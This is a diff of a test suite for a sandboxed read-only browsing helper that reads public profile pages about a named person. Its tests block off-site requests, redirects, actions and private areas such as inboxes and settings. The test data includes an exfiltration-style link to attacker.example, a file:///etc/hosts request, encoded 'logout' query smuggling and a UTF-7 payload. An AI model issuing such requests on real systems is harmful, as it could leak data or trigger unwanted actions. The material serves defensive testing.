@@ -33,8 +33,8 @@ def _grant(**kw) -> dict:
     base = {"v": 2, "domains": ["alpha.example"], "given": [{"url": "https://alpha.example/people/dana-example", "origin": "source"},
                                                             {"url": "https://alpha.example/search?q=Dana", "origin": "search"}],
             "sites": [{"site": "alpha", "domains": ["alpha.example"], "assets": ["static.alpha-cdn.example"]}],
-            "follow": [{"domains": ["alpha.example"], "patterns": [r"/in/[a-z-]+", r"/people/[a-z-]+(?:/about)?"], "reserved": ["settings"]}],
-            "max_opens": 3, "max_followed": 2, "names": [], "harness": "", "loopback_for_test": False}
+            "follow": [{"domains": ["alpha.example"], "patterns": [r"/in/(?P<name>[a-z-]+)", r"/people/(?P<name>[a-z-]+)(?:/about)?"], "reserved": ["settings"]}],
+            "max_opens": 3, "max_followed": 2, "names": ["dana"], "harness": "", "loopback_for_test": False}
     base.update(kw)
     return base
 
@@ -135,7 +135,7 @@ def test_an_address_built_from_what_a_page_said_is_never_opened(helper, capsys):
 
 
 def test_a_link_that_leaves_the_host_or_is_an_action_or_a_download_or_a_redirect_is_never_offered_or_opened(helper, capsys):
-    links = [{"h": "https://alpha.example/in/ok-page", "t": "ok"},
+    links = [{"h": "https://alpha.example/in/dana-ok-page", "t": "ok"},
              {"h": "https://attacker.example/collect?d=x", "t": "other host"},
              {"h": "https://sub.alpha.example/in/x", "t": "another host of the site"},
              {"h": "https://alpha.example/logout", "t": "Log out"},
@@ -151,7 +151,7 @@ def test_a_link_that_leaves_the_host_or_is_an_action_or_a_download_or_a_redirect
                                                                  "text": "page", "links": links}
     code, out = _open("https://alpha.example/people/dana-example", capsys)
     shown = [line.split(" | ")[-1] for line in out.splitlines() if line.startswith("- ")]
-    assert shown == ["https://alpha.example/in/ok-page"]
+    assert shown == ["https://alpha.example/in/dana-ok-page"]
     for bad in links[1:]:
         assert _open(bad["h"], capsys)[0] == 2, bad["h"]
     assert len(helper.ran) == 2                                                           # none of them reached the harness (the first open ran two calls)
@@ -168,10 +168,10 @@ def test_a_given_source_that_looks_like_an_action_is_refused_but_a_search_for_a_
 def test_a_site_whose_rule_is_missing_offers_no_links_and_follows_none(helper, capsys):
     helper.grant(follow=[])                                  # a site with no entry in the table, or one where viewing tells the person viewed
     helper.pages["https://alpha.example/people/dana-example"] = {"url": "https://alpha.example/people/dana-example", "title": "Dana", "text": "page",
-                                                                 "links": [{"h": "https://alpha.example/in/ok-page", "t": "ok"}]}
+                                                                 "links": [{"h": "https://alpha.example/in/dana-ok-page", "t": "ok"}]}
     code, out = _open("https://alpha.example/people/dana-example", capsys)
     assert code == 0 and "LINKS ON THIS PAGE" not in out
-    code, out = _open("https://alpha.example/in/ok-page", capsys)
+    code, out = _open("https://alpha.example/in/dana-ok-page", capsys)
     assert code == 2 and "not given" in out
 
 
@@ -762,13 +762,13 @@ def _load_namespace(policy: dict, url: str = "https://alpha.example/in/start") -
     return ns
 
 
-POLICY = {"domains": ["alpha.example"], "assets": ["static.alpha-cdn.example"], "loopback": False, "asset_types": list(rb.ASSET_TYPES),
-          "action": rb.action_pattern()}
+POLICY = {"domains": ["alpha.example"], "loopback": False, "action": rb.action_pattern()}
 
 
 @pytest.mark.parametrize("url, kind, ok", [
     ("https://alpha.example/in/start", "Document", True), ("https://www.alpha.example/in/other", "Document", True),
-    ("https://alpha.example/img/a.png", "Image", True), ("https://alpha.example/api/x", "XHR", True),
+    ("https://alpha.example/img/a.png", "Image", False), ("https://alpha.example/api/x", "XHR", False),
+    ("https://alpha.example/a.css", "Stylesheet", False), ("https://alpha.example/f.woff", "Font", False),
     # B1: every kind of request to any other host is failed before it is sent, at any hop
     ("https://attacker.example/landed", "Document", False), ("https://attacker.example/x", "Image", False),
     ("https://attacker.example/x.js", "Script", False), ("https://attacker.example/f", "Fetch", False), ("https://attacker.example/p", "Prefetch", False),
@@ -777,7 +777,8 @@ POLICY = {"domains": ["alpha.example"], "assets": ["static.alpha-cdn.example"], 
     ("http://alpha.example:9222/json", "Document", False), ("https://user:pw@alpha.example/x", "Document", False),
     ("ftp://alpha.example/x", "Document", False), ("file:///etc/hosts", "Document", False),
     # the site's own static host: a script, style, font or XHR, never an image, a frame, a prefetch
-    ("https://static.alpha-cdn.example/app.js", "Script", True), ("https://static.alpha-cdn.example/a.css", "Stylesheet", True),
+    ("https://static.alpha-cdn.example/app.js", "Script", False), ("https://static.alpha-cdn.example/a.css", "Stylesheet", False),
+    ("https://static.alpha-cdn.example/f.woff2", "Font", False), ("https://static.alpha-cdn.example/x", "XHR", False),
     ("https://static.alpha-cdn.example/i.png", "Image", False), ("https://static.alpha-cdn.example/frame", "Document", False),
     ("https://static.alpha-cdn.example/p", "Prefetch", False),
     # a same-site redirect hop that lands on an action
@@ -809,7 +810,7 @@ def test_a_page_may_reach_only_its_own_connected_site_and_its_own_static_hosts_n
                         {"site": "bravo", "domains": ["bravo.example"], "assets": ["static.bravo-cdn.example"]}])
     assert _open("https://alpha.example/people/dana-example", capsys)[0] == 0
     policy = helper.policies[-1]
-    assert policy["domains"] == ["alpha.example"] and policy["assets"] == ["static.alpha-cdn.example"]
+    assert policy["domains"] == ["alpha.example"] and "assets" not in policy
     helper.pages["https://alpha.example/search?q=Dana"] = {"url": "https://bravo.example/x", "title": "t", "text": "SECRET-TEXT", "links": []}
     code, out = _open("https://alpha.example/search?q=Dana", capsys)                  # ended up on another connected site: left
     assert out.startswith("left the site") and "SECRET-TEXT" not in out
@@ -825,7 +826,8 @@ def test_what_the_browser_stopped_is_counted_in_the_state_and_said_without_namin
 
 # ---- B2: what a followed link may be
 
-FOLLOW = {"follow": [{"domains": ["alpha.example"], "patterns": [r"/in/[a-z-]+", r"/people/[a-z-]+(?:/about)?"], "reserved": ["settings", "home"]}]}
+FOLLOW = {"follow": [{"domains": ["alpha.example"], "patterns": [r"/in/(?P<name>[a-z-]+)", r"/people/(?P<name>[a-z-]+)(?:/about)?"],
+                      "reserved": ["settings", "home"]}]}
 
 
 @pytest.mark.parametrize("href, ok", [
@@ -858,9 +860,8 @@ def test_a_site_with_no_rule_follows_nothing_and_a_page_offers_only_matching_lin
              {"h": "https://alpha.example/in/orlin-fan", "t": "Dana Example fan"}]
     page = {"url": "https://alpha.example/search?q=Dana", "title": "t", "text": "results", "links": links}
     helper.pages["https://alpha.example/search?q=Dana"] = page
-    assert rb.usable_links(links, page["url"], {**_grant(), "names": ["Dana Example"]}) == [
-        ("https://alpha.example/in/dana-example", "Dana Example"), ("https://alpha.example/in/orlin-fan", "Dana Example fan")]
-    assert rb.usable_links(links, page["url"], {**_grant(), "names": []})[0][0] == "https://alpha.example/in/dana-example"
+    assert rb.usable_links(links, page["url"], {**_grant(), "names": ["Dana Example"]}) == [("https://alpha.example/in/dana-example", "Dana Example")]
+    assert rb.usable_links(links, page["url"], {**_grant(), "names": []}) == []             # nothing to name, nothing followed
     assert len(rb.usable_links(links, page["url"], {**_grant(), "follow": []})) == 0            # no rule for the site: none offered
     many = [{"h": f"https://alpha.example/in/dana-{chr(97 + i)}", "t": "Dana"} for i in range(20)]
     assert len(rb.usable_links(many, page["url"], {**_grant(), "names": ["Dana"]})) == rb.MAX_LINKS == 6
@@ -879,29 +880,29 @@ def test_forty_redirector_links_on_one_page_offer_none_and_open_none(helper, cap
 
 def test_the_browser_is_sent_to_the_address_the_page_gave_never_to_the_sessions_spelling_of_it(helper, capsys):
     helper.pages["https://alpha.example/people/dana-example"] = {"url": "https://alpha.example/people/dana-example", "title": "t", "text": "p",
-                                                                 "links": [{"h": "https://alpha.example/in/ok-page", "t": "ok"}]}
+                                                                 "links": [{"h": "https://alpha.example/in/dana-ok-page", "t": "ok"}]}
     assert _open("https://alpha.example/people/dana-example", capsys)[0] == 0
-    assert _open("HTTPS://Alpha.Example/in/ok-page/#frag", capsys)[0] == 0
-    assert helper.urls[-1] == "https://alpha.example/in/ok-page"
+    assert _open("HTTPS://Alpha.Example/in/dana-ok-page/#frag", capsys)[0] == 0
+    assert helper.urls[-1] == "https://alpha.example/in/dana-ok-page"
 
 
 def test_only_so_many_links_are_followed_in_a_question(helper, capsys):
     helper.grant(max_opens=6, max_followed=2)
     helper.pages["https://alpha.example/people/dana-example"] = {
         "url": "https://alpha.example/people/dana-example", "title": "t", "text": "p",
-        "links": [{"h": f"https://alpha.example/in/ok-{c}", "t": "ok"} for c in "abc"]}
+        "links": [{"h": f"https://alpha.example/in/dana-ok-{c}", "t": "ok"} for c in "abc"]}
     assert _open("https://alpha.example/people/dana-example", capsys)[0] == 0
-    assert _open("https://alpha.example/in/ok-a", capsys)[0] == 0 and _open("https://alpha.example/in/ok-b", capsys)[0] == 0
-    code, out = _open("https://alpha.example/in/ok-c", capsys)
+    assert _open("https://alpha.example/in/dana-ok-a", capsys)[0] == 0 and _open("https://alpha.example/in/dana-ok-b", capsys)[0] == 0
+    code, out = _open("https://alpha.example/in/dana-ok-c", capsys)
     assert code == 2 and "followed links are used" in out
 
 
 def test_a_followed_link_that_redirects_off_the_site_never_reaches_the_attacker_and_shows_nothing(helper, capsys):
     helper.pages["https://alpha.example/people/dana-example"] = {"url": "https://alpha.example/people/dana-example", "title": "t", "text": "p",
-                                                                 "links": [{"h": "https://alpha.example/in/ok-page", "t": "ok"}]}
+                                                                 "links": [{"h": "https://alpha.example/in/dana-ok-page", "t": "ok"}]}
     assert _open("https://alpha.example/people/dana-example", capsys)[0] == 0
-    helper.pages["https://alpha.example/in/ok-page"] = {"url": "chrome-error://chromewebdata/", "title": "", "text": "", "links": [], "blocked_n": 1}
-    code, out = _open("https://alpha.example/in/ok-page", capsys)
+    helper.pages["https://alpha.example/in/dana-ok-page"] = {"url": "chrome-error://chromewebdata/", "title": "", "text": "", "links": [], "blocked_n": 1}
+    code, out = _open("https://alpha.example/in/dana-ok-page", capsys)
     assert code == 0 and out.startswith("left the site") and "1 request(s)" in out
 
 
@@ -910,7 +911,7 @@ def test_the_table_marks_the_sites_where_viewing_tells_the_viewed_and_gives_them
     sites = {"linkedin": ("linkedin.com",), "x": ("x.com", "twitter.com"), "orlin-club.org": ("orlin-club.org",)}
     grant = hbr.grant_dict(sites, [])
     assert [r["domains"] for r in grant["follow"]] == [["twitter.com", "x.com"]]       # LinkedIn marked, a site with no entry: no rule at all
-    assert any(site["site"] == "linkedin" and site["assets"] == ["licdn.com"] for site in grant["sites"])
+    assert any(site["site"] == "linkedin" and site["domains"] == ["linkedin.com"] and "assets" not in site for site in grant["sites"])
     for key, entry in hbr.PROFILES.items():
         for pattern in entry.patterns:
             assert re.compile(pattern)
@@ -996,3 +997,378 @@ def test_the_audit_says_which_daemon_answered(bank, tmp_path, monkeypatch):
     assert any(l["tool"] == "daemon" and "'scratch-daemon'" in l["what"] and l["in"] == "signed_in" for l in out.audit)
     sess = ha.Session(compartment="signed_in", daemon="scratch-daemon", calls=[ha.Call("a", "Bash", "page", "https://x.com/a", how="source")])
     assert hq._trail([sess])[0] == {"tool": "daemon", "what": "read through the browser-harness daemon named 'scratch-daemon'", "in": "signed_in"}
+
+
+# --------------------------------------------------------------------------- round 3: what leaves, what changes, whose areas
+
+
+def _pump_namespace(policy: dict, events: list[dict], cdp, url: str = "https://alpha.example/in/start") -> dict:
+    """The load script's own code up to the read: its definitions, with the browser replaced by ``cdp`` and a queue of paused-request events."""
+    code = rb._LOAD.replace("__URL__", json.dumps(json.dumps(url))).replace("__TARGET__", json.dumps(json.dumps("T"))).replace(
+        "__POLICY__", json.dumps(json.dumps(policy)))
+    ns: dict = {"drain_events": lambda: [events.pop(0)] if events else [], "cdp": cdp}
+    exec(code[:code.index("sid = cdp(")], ns)                              # noqa: S102 - the helper's own fixed code
+    ns["sessions"].add("S1")
+    return ns
+
+
+class FakeBrowser:
+    """A stand-in for the harness's ``cdp``: records every call, answers a body stream from ``chunks`` (``("data", base64?)`` then eof)."""
+
+    def __init__(self, chunks=(b"<html><body>hi</body></html>",), hang=False, endless=False):
+        self.calls: list[tuple[str, dict]] = []
+        self.chunks, self.hang, self.endless = list(chunks), hang, endless
+
+    def __call__(self, method, session_id=None, _response_timeout=None, **params):
+        self.calls.append((method, params))
+        if method == "Fetch.takeResponseBodyAsStream":
+            return {"stream": "H1"}
+        if method == "IO.read":
+            import base64
+
+            if self.hang:
+                raise TimeoutError("no data")
+            if self.endless:
+                return {"data": base64.b64encode(b"x" * 65536).decode(), "base64Encoded": True, "eof": False}
+            if not self.chunks:
+                return {"data": "", "base64Encoded": True, "eof": True}
+            chunk = self.chunks.pop(0)
+            return {"data": base64.b64encode(chunk).decode(), "base64Encoded": True, "eof": not self.chunks}
+        return {}
+
+    def named(self, method: str) -> list[dict]:
+        return [p for m, p in self.calls if m == method]
+
+
+def _paused(url="https://alpha.example/in/start", typ="Document", method="GET", frame="F1", rid="R1", **extra) -> dict:
+    return {"method": "Fetch.requestPaused", "session_id": "S1",
+            "params": {"requestId": rid, "resourceType": typ, "frameId": frame, "request": {"url": url, "method": method}, **extra}}
+
+
+def _doc_answer(url="https://alpha.example/in/start", status=200, headers=None, rid="R1", frame="F1") -> dict:
+    hs = [{"name": k, "value": v} for k, v in (headers if headers is not None else {"Content-Type": "text/html; charset=utf-8"}).items()]
+    return _paused(url, "Document", rid=rid, frame=frame, responseStatusCode=status, responseHeaders=hs)
+
+
+def _body(call: dict) -> str:
+    import base64
+
+    return base64.b64decode(call["body"]).decode("utf-8")
+
+
+def _header_names(call: dict) -> list[str]:
+    return [h["name"].lower() for h in call["responseHeaders"]]
+
+
+@pytest.mark.parametrize("raw, ctype, expect", [
+    (b"\xef\xbb\xbf<p>caf\xc3\xa9</p>", "text/html", "<p>café</p>"),
+    ("<p>café</p>".encode("utf-16"), "text/html", "<p>café</p>"),
+    ("<p>café</p>".encode("utf-16-le"), "text/html; charset=utf-16le", "<p>café</p>"),
+    ("<p>café</p>".encode("cp1252"), "text/html; charset=windows-1252", "<p>café</p>"),
+    ("<p>café</p>".encode("latin-1"), "text/html", "<p>café</p>"),                                         # not UTF-8: read as windows-1252
+    (b'<meta charset="iso-8859-1"><p>caf\xe9</p>', "text/html", '<meta charset="iso-8859-1"><p>café</p>'),
+    ("<p>café</p>".encode("utf-8"), "text/html; charset=x-no-such-charset", "<p>café</p>"),
+    (b"+ADw-link rel+AD0-preconnect+AD4-", "text/html; charset=utf-7", "<link rel=preconnect>"),
+])
+def test_a_body_is_decoded_to_the_characters_the_page_sent_whatever_its_encoding(raw, ctype, expect):
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    assert ns["decode_body"](raw, ctype) == expect
+
+
+@pytest.mark.parametrize("headers, status", [
+    ({"Content-Type": "application/pdf"}, 200), ({"Content-Type": "application/json"}, 200), ({"Content-Type": "text/plain"}, 200),
+    ({"Content-Type": "application/xhtml+xml"}, 200), ({}, 200), ({"Content-Type": "application/octet-stream"}, 200),
+    ({"Content-Type": "text/html", "Content-Disposition": "attachment; filename=a.html"}, 200), ({"Content-Type": "text/html"}, 204),
+    ({"Content-Type": "text/html"}, 304),
+])
+def test_an_answer_that_is_not_a_web_page_or_is_a_download_is_failed_and_never_shown(headers, status):
+    fb = FakeBrowser()
+    ns = _pump_namespace(POLICY, [_doc_answer(status=status, headers=headers)], fb)
+    ns["pump"]()
+    assert fb.named("Fetch.failRequest") and not fb.named("Fetch.continueResponse") and not ns["result"]
+    assert ns["refused"]
+
+
+def test_a_redirect_is_followed_only_to_a_document_the_site_may_serve_and_otherwise_failed_before_the_browser_follows_it():
+    for location, ok in (("/in/other", True), ("https://alpha.example/in/other", True), ("https://attacker.example/hit", False),
+                         ("//attacker.example/hit", False), ("https://alpha.example.evil.example/", False), ("/logout", False),
+                         ("/session/log-me-out", False), ("https://static.alpha-cdn.example/frame", False), ("/in/x?next=https://attacker.example", False),
+                         ("data:text/html,x", True)):
+        fb = FakeBrowser()
+        _pump_namespace(POLICY, [], fb)
+        ns = _pump_namespace(POLICY, [_doc_answer(status=302, headers={"Location": location})], fb)
+        ns["pump"]()
+        assert bool(fb.named("Fetch.continueResponse")) is ok and bool(fb.named("Fetch.failRequest")) is (not ok), location
+
+
+def test_only_a_get_of_a_document_on_the_site_is_continued_and_every_other_request_is_failed_before_it_is_sent():
+    fb = FakeBrowser()
+    events = [_paused(rid="a"), _paused(rid="b", method="POST"), _paused("https://alpha.example/api/do", "XHR", rid="c"),
+              _paused("https://alpha.example/img.png", "Image", rid="d"), _paused("https://static.alpha-cdn.example/a.css", "Stylesheet", rid="e"),
+              _paused("https://static.alpha-cdn.example/app.js", "Script", rid="f"), _paused("https://alpha.example/in/f", "Document", frame="OTHER", rid="g"),
+              _paused("https://alpha.example/in/y", "Document", method="PUT", rid="h"), _paused("https://alpha.example/in/z", "Ping", rid="i"),
+              _paused("https://alpha.example/api/beacon", "Other", method="POST", rid="j"), _paused("https://alpha.example/in/k", "Prefetch", rid="k")]
+    ns = _pump_namespace(POLICY, events, fb)
+    for _ in range(len(events)):
+        ns["pump"]()
+    let_through = sorted(p["requestId"] for p in fb.named("Fetch.continueRequest"))
+    failed = sorted(p["requestId"] for p in fb.named("Fetch.failRequest"))
+    assert let_through == ["a"] and failed == ["b", "c", "d", "e", "f", "g", "h", "i", "j", "k"]
+
+
+@pytest.mark.parametrize("url, typ, ok", [
+    ("https://alpha.example/in/x?do=logout", "Document", False), ("https://alpha.example/in/x?action=delete", "Document", False),
+    ("https://alpha.example/in/x?u=https://attacker.example", "Document", False), ("https://alpha.example/in/x?n=%2F%2Fattacker.example", "Document", False),
+    ("https://alpha.example/in/x?page=2&sort=new", "Document", True), ("https://alpha.example/in/x?q=%6Cogout", "Document", False),
+    ("https://alpha.example/in/x?q=%256Cogout", "Document", False), ("https://alpha.example/in/x?q=log-me-out", "Document", False),
+])
+def test_the_action_test_covers_the_query_as_well_as_the_path_of_every_request_that_is_let_through(url, typ, ok):
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    assert ns["allowed"]({"request": {"url": url, "method": "GET"}, "resourceType": typ}) is ok, url
+
+
+@pytest.mark.parametrize("method", ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
+@pytest.mark.parametrize("typ", ["Document", "Stylesheet", "Font", "XHR", "Fetch", "Image", "Ping", "Other", "Script", "Prefetch"])
+@pytest.mark.parametrize("host", ["alpha.example", "static.alpha-cdn.example", "attacker.example"])
+def test_no_method_but_get_is_let_through_for_any_type_on_any_host(method, typ, host):
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    assert not ns["allowed"]({"request": {"url": f"https://{host}/x", "method": method}, "resourceType": typ})
+    assert not ns["allowed"]({"request": {"url": f"https://{host}/x", "method": "GET", "hasPostData": True}, "resourceType": typ})
+
+
+def test_an_answer_that_cannot_be_read_in_time_or_is_endless_fails_closed_or_is_cut_at_the_cap(monkeypatch):
+    fb = FakeBrowser(hang=True)
+    ns = _pump_namespace(POLICY, [_doc_answer()], fb)
+    ns["pump"]()
+    assert fb.named("Fetch.failRequest") and not ns["result"]                                           # a read that stalls: failed, never continued
+    assert fb.named("IO.close")                                                                         # and the stream is closed
+    fb2 = FakeBrowser(endless=True)
+    ns2 = _pump_namespace({**POLICY, "max_body": 200000}, [_doc_answer()], fb2)
+    ns2["pump"]()
+    assert len(ns2["result"]["text"]) <= 200000 + 65536 and "long" in ns2["refused"]                    # cut at the cap, said
+    assert fb2.named("Fetch.failRequest")[0]["errorReason"] == "Aborted" and fb2.named("IO.close")
+    clock = iter([0.0, 0.0, 99.0, 99.0, 99.0])
+    fb3 = FakeBrowser(endless=True)
+    ns3 = _pump_namespace(POLICY, [_doc_answer()], fb3)
+    monkeypatch.setattr(ns3["time"], "time", lambda: next(clock, 99.0))
+    ns3["pump"]()
+    assert fb3.named("Fetch.failRequest") and not ns3["result"] and "too slow" in ns3["refused"]
+
+
+def test_a_handling_error_fails_the_request_and_never_leaves_it_to_run():
+    class Broken(FakeBrowser):
+        def __call__(self, method, *a, **k):
+            if method == "Fetch.takeResponseBodyAsStream":
+                raise RuntimeError("boom")
+            return super().__call__(method, *a, **k)
+
+    fb = Broken()
+    ns = _pump_namespace(POLICY, [_doc_answer()], fb)
+    ns["pump"]()
+    assert fb.named("Fetch.failRequest") and not fb.named("Fetch.continueResponse") and not ns["result"]
+
+
+def test_what_a_page_declares_about_itself_is_read_from_the_markup_and_shown_as_text(helper, capsys):
+    helper.pages["https://alpha.example/people/dana-example"] = {
+        "url": "https://alpha.example/people/dana-example", "title": "t", "text": "body text", "links": [],
+        "declared": ["description: A builder of small tools", "og:title: Dana Example"]}
+    code, out = _open("https://alpha.example/people/dana-example", capsys)
+    assert code == 0 and "What the page says about itself:\ndescription: A builder of small tools\nog:title: Dana Example\n\nbody text" in out
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    assert ns["declared"]("<meta name='description' content='Hello &amp; welcome'><meta property=og:site_name content=Alpha><meta name=viewport content=x>") == [
+        "description: Hello & welcome", "og:site_name: Alpha"]
+
+
+def test_a_document_the_browser_would_not_serve_is_reported_in_words_and_its_text_is_never_shown(helper, capsys):
+    helper.pages["https://alpha.example/people/dana-example"] = {"url": "chrome-error://chromewebdata/", "title": "", "text": "SECRET", "links": [],
+                                                                 "refused": ["not a web page"], "blocked_n": 1}
+    code, out = _open("https://alpha.example/people/dana-example", capsys)
+    assert code == 0 and out.startswith("LEFT: that address is not a page that is read (it is not a web page)") and "SECRET" not in out
+
+
+# ---- whose areas: a name in the address, never in the label
+
+PRIVATE_AREAS = {
+    "x": ["/messages", "/messages/123-456", "/i/chat", "/i/grok", "/i/bookmarks", "/i/lists/123", "/i/notifications", "/notifications", "/settings",
+          "/settings/account", "/explore", "/home", "/search", "/search?q=dana", "/bookmarks", "/lists", "/grok", "/compose/post", "/i/flow/login"],
+    "reddit": ["/message/inbox", "/message/messages", "/chat", "/notifications", "/settings", "/saved", "/r/all", "/r/popular", "/r/friends", "/r/mod",
+               "/r/home", "/user/me/saved", "/prefs", "/submit", "/search?q=dana", "/user/dana_example/saved", "/user/dana_example/upvoted"],
+    "linkedin": ["/messaging/", "/messaging/thread/2-abc/", "/notifications/", "/mynetwork/", "/feed/", "/jobs/", "/psettings/", "/saved-posts/",
+                 "/in/dana-example/detail/contact-info/", "/in/dana-example/recent-activity/all/", "/search/results/all/?keywords=dana"],
+    "youtube": ["/feed/history", "/feed/library", "/feed/subscriptions", "/playlist?list=WL", "/playlist?list=LL", "/account", "/premium", "/results?search_query=dana",
+                "/watch?v=abc", "/@dana/community", "/@dana/playlists", "/shorts/abc"],
+    "instagram": ["/direct/inbox/", "/direct/t/123/", "/explore/", "/accounts/settings/", "/accounts/activity/", "/stories/dana/123/", "/reels/", "/notifications/",
+                  "/saved/", "/p/abc/", "/dana_example/saved/", "/dana_example/tagged/"],
+    "facebook": ["/messages/t/123", "/messages", "/notifications", "/bookmarks", "/settings", "/friends", "/marketplace", "/watch", "/saved", "/gaming",
+                 "/groups", "/events", "/stories", "/profile.php?id=1000", "/me"],
+    "tiktok": ["/messages", "/following", "/foryou", "/explore", "/live", "/inbox", "/@dana_example/video/1", "/@dana_example/liked", "/search?q=dana"],
+    "pinterest": ["/messages", "/conversations", "/notifications", "/settings", "/ideas", "/today", "/pin/123", "/search/pins/?q=dana", "/business", "/following",
+                  "/homefeed", "/dana_example/saved", "/dana_example/boards"],
+    "substack": ["/inbox", "/notes", "/chat", "/activity", "/settings", "/dashboard", "/subscribe", "/account", "/@dana/chat", "/@dana/followers", "/"],
+    "goodreads": ["/user/show/123", "/review/list/123", "/message/inbox", "/notifications", "/friend", "/shelf", "/book/show/1", "/author/dashboard",
+                  "/author/show/123?from_search=true"],
+    "spotify": ["/user/xyz", "/playlist/37i9dQZF1DXcBWIGoYBM5M", "/collection/tracks", "/search/dana", "/artist/" + "a" * 22 + "?si=abc", "/queue"],
+}
+HOSTS = {"x": "x.com", "reddit": "www.reddit.com", "linkedin": "www.linkedin.com", "youtube": "www.youtube.com", "instagram": "www.instagram.com",
+         "facebook": "www.facebook.com", "tiktok": "www.tiktok.com", "pinterest": "www.pinterest.com", "substack": "dana.substack.com",
+         "goodreads": "www.goodreads.com", "spotify": "open.spotify.com"}
+
+
+def _site_grant(site: str, names=("Dana Example",)) -> dict:
+    return hbr.grant_dict({site: hbr.site_domains(site)}, [], names=list(names))
+
+
+def test_the_private_area_table_covers_every_site_of_the_table():
+    assert set(PRIVATE_AREAS) == set(hbr.PROFILES) - set() and set(HOSTS) == set(hbr.PROFILES)
+    for site, paths in PRIVATE_AREAS.items():
+        assert len(paths) >= 6, site
+        for wants in (("messag", "direct", "inbox", "chat"), ("notif", "activity"), ("settings", "psettings", "account", "prefs")):
+            if site not in ("goodreads", "spotify", "tiktok", "youtube", "substack"):
+                assert any(w in p for p in paths for w in wants), (site, wants)
+
+
+@pytest.mark.parametrize("site", sorted(PRIVATE_AREAS))
+def test_a_private_area_of_a_site_is_never_given_as_a_source_nor_followed_from_a_page(site):
+    grant = _site_grant(site)
+    for path in PRIVATE_AREAS[site]:
+        href = f"https://{HOSTS[site]}{path}"
+        assert hbr.source_reason(href), (site, path)                       # never handed to the session as a tracked source
+        assert rb.follow_reason(href, grant), (site, path)                 # never a link of a page it may follow, whatever the link's label says
+        assert rb.usable_links([{"h": href, "t": "Dana Example"}], f"https://{HOSTS[site]}/", grant) == [], (site, path)
+
+
+def test_the_question_s_name_must_be_in_the_address_itself_a_label_alone_never_counts():
+    grant = _site_grant("x")
+    page = "https://x.com/search"
+    labelled = [{"h": "https://x.com/messages", "t": "Dana Example"}, {"h": "https://x.com/i/chat", "t": "Dana Example"},
+                {"h": "https://x.com/settings", "t": "Dana Example"}, {"h": "https://x.com/someone_else", "t": "Dana Example"},
+                {"h": "https://x.com/dana_example", "t": "click here"}, {"h": "https://x.com/DanaExample", "t": ""}]
+    assert rb.usable_links(labelled, page, grant) == [("https://x.com/dana_example", "click here"), ("https://x.com/DanaExample", "")]
+    assert rb.follow_reason("https://x.com/someone_else", grant) == "that address does not name what the question is about"
+    assert rb.names_it("dana_example", ["Dana Example"]) and not rb.names_it("someone_else", ["Dana Example"]) and not rb.names_it("", ["Dana Example"])
+    assert not rb.names_it("dana", ["Da"]) and not rb.names_it("anything", [])                      # a name shorter than three letters or none: nothing to match
+
+
+def test_a_site_whose_profile_address_carries_no_name_is_never_followed_from_a_page_but_may_be_a_tracked_source():
+    for site, href in (("spotify", "https://open.spotify.com/artist/" + "a" * 22), ("youtube", "https://www.youtube.com/channel/UC" + "a" * 22),
+                       ("goodreads", "https://www.goodreads.com/author/show/123")):
+        assert hbr.source_reason(href) == "", href
+        grant = _site_grant(site, names=("Dana Example", "Dana"))
+        assert rb.follow_reason(href, grant), href
+        assert rb.usable_links([{"h": href, "t": "Dana Example"}], href, grant) == []
+    assert not any(r["domains"] == ["spotify.com"] for r in _site_grant("spotify")["follow"])         # no rule at all for it
+    assert hbr.PROFILES["spotify"].client_rendered and "spotify" not in hbr.NO_FOLLOW
+    assert rb.follow_reason("https://www.goodreads.com/author/show/123.Dana_Example", _site_grant("goodreads")) == ""    # the slug names it
+    assert rb.follow_reason("https://www.youtube.com/@dana_example", _site_grant("youtube")) == ""
+
+
+def test_an_organisations_own_subdomain_names_it_for_a_publication_s_about_page_and_the_root_pattern_is_gone():
+    grant = _site_grant("substack", names=("Orlin Club",))
+    assert rb.follow_reason("https://orlin-club.substack.com/about", grant) == ""
+    assert rb.follow_reason("https://someone-else.substack.com/about", grant)
+    assert rb.follow_reason("https://substack.com/about", grant)                                           # the host names nobody
+    assert rb.follow_reason("https://orlin-club.substack.com/", grant)
+    for entry in hbr.PROFILES.values():                                                                    # the pattern that could never match is removed
+        assert not any(re.fullmatch(p, "/") for p in entry.patterns)
+    for key, entry in hbr.PROFILES.items():
+        for pattern in entry.patterns:
+            assert re.compile(pattern)
+        assert all(("(?P<name>" in p) or entry.host_named or True for p in entry.patterns)
+        assert isinstance(entry.client_rendered, bool) and isinstance(entry.host_named, bool)
+
+
+def test_a_grant_carries_only_the_patterns_that_name_the_account_and_the_reserved_words_of_its_site():
+    grant = hbr.grant_dict({"x": ("x.com",), "goodreads": ("goodreads.com",), "substack": ("substack.com",)}, [], names=["Dana"])
+    rules = {tuple(r["domains"]): r for r in grant["follow"]}
+    assert all("(?P<name>" in p for p in rules[("x.com",)]["patterns"] + rules[("goodreads.com",)]["patterns"])
+    assert rules[("substack.com",)]["host_named"] is True and "/about" in rules[("substack.com",)]["patterns"]
+    for word in ("messages", "chat", "notifications", "settings", "bookmarks", "lists", "grok", "explore", "home", "search", "i"):
+        assert word in rules[("x.com",)]["reserved"], word
+
+
+@pytest.mark.parametrize("url, ok", [
+    ("https://x.com/dana_example", True), ("https://x.com/dana_example?s=20", False), ("https://x.com/dana_example?", False),
+    ("https://www.youtube.com/@dana_example/about", True), ("https://www.youtube.com/@dana_example/about?si=x", False),
+    ("https://www.linkedin.com/in/dana-example?trk=x", False), ("https://www.reddit.com/user/dana_example?utm_source=share", False),
+    ("https://elsewhere.example/anything?x=1", True),
+])
+def test_a_tracked_source_with_a_query_string_is_not_given_unless_its_site_names_the_parameter(url, ok):
+    assert (hbr.source_reason(url) == "") is ok, url
+    assert hbr.source_reason("https://x.com/dana_example?s=20")
+    hbr.PROFILES["x"].__class__                                                                           # the field exists and is empty for every site
+    assert all(entry.params == () for entry in hbr.PROFILES.values())
+
+
+def test_the_helper_s_source_holds_no_more_than_the_reading_verbs_and_the_new_calls_stay_inside_the_tab_s_own_session():
+    src = Path(rb.__file__).read_text()
+    for cdp_call in re.findall(r'cdp\(\s*"([A-Za-z.]+)"', rb._LOAD):
+        assert cdp_call in {"Fetch.enable", "Page.enable", "Network.enable", "Network.setBypassServiceWorker", "Page.setPrerenderingAllowed",
